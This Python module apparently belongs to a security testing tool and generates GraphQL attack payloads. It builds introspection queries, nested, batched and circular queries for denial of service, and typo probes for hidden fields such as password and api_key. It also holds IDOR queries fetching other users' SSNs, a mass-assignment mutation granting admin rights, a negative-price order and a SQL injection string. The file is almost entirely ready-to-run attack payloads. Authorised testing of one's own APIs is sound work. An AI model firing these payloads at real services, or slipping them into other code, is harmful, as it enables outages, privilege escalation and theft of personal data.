#!/usr/bin/env python3
"""
Enhanced GraphQL Testing Module
Tests for GraphQL vulnerabilities: introspection, depth attacks, field suggestions
"""

import json
from typing import List, Dict, Optional


class GraphQLTester:
    """Advanced GraphQL vulnerability testing"""

    @staticmethod
    def introspection_query() -> str:
        """
        Full introspection query to discover schema

        Returns:
            GraphQL introspection query
        """
        return """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              ...FullType
            }
            directives {
              name
              description
              locations
              args {
                ...InputValue
              }
            }
          }
        }
        
        fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args {
              ...InputValue
            }
            type {
              ...TypeRef
            }
            isDeprecated
            deprecationReason
          }
          inputFields {
            ...InputValue
          }
          interfaces {
            ...TypeRef
          }
          enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
          }
          possibleTypes {
            ...TypeRef
          }
        }
        
        fragment InputValue on __InputValue {
          name
          description
          type { ...TypeRef }
          defaultValue
        }
        
        fragment TypeRef on __Type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """

    @staticmethod
    def simple_introspection_query() -> str:
        """Simplified introspection query"""
        return """
        {
          __schema {
            types {
              name
              fields {
                name
                type {
                  name
                  kind
                }
              }
            }
          }
        }
        """

    @staticmethod
    def generate_depth_attack(depth: int = 100) -> str:
        """
        Generate deeply nested query for DoS

        Args:
            depth: Nesting depth (default: 100)

        Returns:
            Deeply nested GraphQL query
        """
        query = "query DepthAttack {\n"

        # Build nested structure
        indent = "  "
        for i in range(depth):
            query += indent * (i + 1) + "user {\n"
            query += indent * (i + 2) + "id\n"
            query += indent * (i + 2) + "name\n"
            query += indent * (i + 2) + "posts {\n"
            query += indent * (i + 3) + "id\n"
            query += indent * (i + 3) + "title\n"
            query += indent * (i + 3) + "author {\n"

        # Close all brackets
        for i in range(depth):
            query += indent * (depth - i + 2) + "}\n"
            query += indent * (depth - i + 1) + "}\n"
            query += indent * (depth - i) + "}\n"

        query += "}"

        return query

    @staticmethod
    def generate_batch_attack(count: int = 100) -> str:
        """
        Generate batch query for DoS

        Args:
            count: Number of queries in batch

        Returns:
            Batch GraphQL query
        """
        queries = []

        for i in range(count):
            queries.append(f"""
            query{i}: users {{
              id
              name
              email
              posts {{
                id
                title
                content
                comments {{
                  id
                  text
                  author {{
                    id
                    name
                  }}
                }}
              }}
            }}
            """)

        return "{\n" + "\n".join(queries) + "\n}"

    @staticmethod
    def generate_circular_query(depth: int = 50) -> str:
        """
        Generate circular reference query

        Args:
            depth: Circular depth

        Returns:
            Circular GraphQL query
        """
        query = "query CircularAttack {\n  user(id: 1) {\n    id\n    name\n"

        for i in range(depth):
            query += "    friends {\n      id\n      name\n"

        for i in range(depth):
            query += "    }\n"

        query += "  }\n}"

        return query

    @staticmethod
    def field_suggestion_queries() -> List[str]:
        """
        Generate queries to discover hidden fields via suggestions

        Returns:
            List of queries with typos to trigger suggestions
        """
        return [
            "{ user { idd } }",  # Typo: id -> idd (suggests: id)
            "{ user { usernam } }",  # Typo: username -> usernam
            "{ user { emai } }",  # Typo: email -> emai
            "{ user { passwor } }",  # Typo: password -> passwor
            "{ user { toke } }",  # Typo: token -> toke
            "{ user { ap_key } }",  # Typo: api_key -> ap_key
            "{ user { isAdmi } }",  # Typo: isAdmin -> isAdmi
            "{ user { rol } }",  # Typo: role -> rol
        ]

    @staticmethod
    def idor_queries() -> List[Dict]:
        """
        Generate IDOR test queries

        Returns:
            List of query dicts with variables
        """
        return [
            {
                "query": "query GetUser($id: ID!) { user(id: $id) { id name email phone address ssn } }",
                "variables": {"id": "1"},
            },
            {
                "query": "query GetUser($id: ID!) { user(id: $id) { id name email phone address ssn } }",
                "variables": {"id": "2"},
            },
            {
                "query": "query GetUser($id: ID!) { user(id: $id) { id name email phone address ssn } }",
                "variables": {"id": "999999"},
            },
            {
                "query": "query GetPost($id: ID!) { post(id: $id) { id title content author { id email } } }",
                "variables": {"id": "1"},
            },
        ]

    @staticmethod
    def mutation_attacks() -> List[str]:
        """
        Generate mutation attack queries

        Returns:
            List of mutation queries
        """
        return [
            # Mass assignment
            """
            mutation {
              updateUser(id: 1, input: {
                name: "Hacker"
                email: "hacker@evil.com"
                role: "admin"
                isAdmin: true
                permissions: ["*"]
              }) {
                id
                role
                isAdmin
              }
            }
            """,
            # Negative price
            """
            mutation {
              createOrder(input: {
                productId: 1
                quantity: 1
                price: -100
              }) {
                id
                total
              }
            }
            """,
            # SQL injection in mutation
            """
            mutation {
              createUser(input: {
                name: "test' OR '1'='1"
                email: "test@test.com"
              }) {
                id
              }
            }
            """,
        ]

    @staticmethod
    def directive_overload() -> str:
        """
        Generate query with excessive directives

        Returns:
            Query with directive overload
        """
        query = "query DirectiveOverload {\n"

        for i in range(100):
            query += f"  field{i}: user(id: 1) @include(if: true) @skip(if: false) {{\n"
            query += "    id\n"
            query += "    name\n"
            query += "  }\n"

        query += "}"

        return query

    @staticmethod
    def generate_all_attacks() -> Dict[str, any]:
        """
        Generate all GraphQL attack payloads

        Returns:
            Dict with attack type -> payloads
        """
        return {
            "introspection_full": GraphQLTester.introspection_query(),
            "introspection_simple": GraphQLTester.simple_introspection_query(),
            "depth_attack_50": GraphQLTester.generate_depth_attack(50),
            "depth_attack_100": GraphQLTester.generate_depth_attack(100),
            "batch_attack_50": GraphQLTester.generate_batch_attack(50),
            "batch_attack_100": GraphQLTester.generate_batch_attack(100),
            "circular_query": GraphQLTester.generate_circular_query(50),
            "field_suggestions": GraphQLTester.field_suggestion_queries(),
            "idor_queries": GraphQLTester.idor_queries(),
            "mutation_attacks": GraphQLTester.mutation_attacks(),
            "directive_overload": GraphQLTester.directive_overload(),
        }


# Test
if __name__ == "__main__":
    print("GraphQL Testing Module\n")

    print("=== Introspection Query ===")
    introspection = GraphQLTester.simple_introspection_query()
    print(introspection[:200] + "...\n")

    print("=== Depth Attack (10 levels) ===")
    depth_attack = GraphQLTester.generate_depth_attack(10)
    print(depth_attack[:300] + "...\n")

    print("=== Batch Attack (5 queries) ===")
    batch_attack = GraphQLTester.generate_batch_attack(5)
    print(batch_attack[:300] + "...\n")

    print("=== Field Suggestions ===")
    suggestions = GraphQLTester.field_suggestion_queries()
    for query in suggestions[:3]:
        print(f"  {query}")
    print()

    print("=== IDOR Queries ===")
    idor = GraphQLTester.idor_queries()
    for q in idor[:2]:
        print(f"  Query: {q['query'][:60]}...")
        print(f"  Variables: {q['variables']}")
    print()

    print("=== Mutation Attacks ===")
    mutations = GraphQLTester.mutation_attacks()
    print(f"  Generated {len(mutations)} mutation attack payloads")

    print("\n=== All Attacks Summary ===")
    all_attacks = GraphQLTester.generate_all_attacks()
    for attack_type, payload in all_attacks.items():
        if isinstance(payload, list):
            print(f"  {attack_type}: {len(payload)} payloads")
        else:
            print(f"  {attack_type}: {len(payload)} chars")
